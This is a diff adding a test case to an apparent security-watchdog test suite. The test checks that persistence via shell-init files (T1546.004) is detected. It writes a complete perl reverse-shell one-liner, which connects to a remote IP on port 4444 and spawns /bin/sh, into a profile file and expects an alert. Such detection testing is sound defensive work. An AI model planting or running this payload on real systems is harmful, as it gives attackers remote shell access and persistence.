@@ -290,3 +290,17 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on shell-init surface)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp shell-init
+    # rev-shell variants already locked. Perl on every Debian/
+    # Ubuntu host. Locks perl axis on T1546.004 shell-init per-
+    # login source surface — /etc/profile + /etc/bash.bashrc
+    # sourced on every interactive login.
+    seed_benign
+    run_wd
+    printf 'perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${PROFILE_F}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
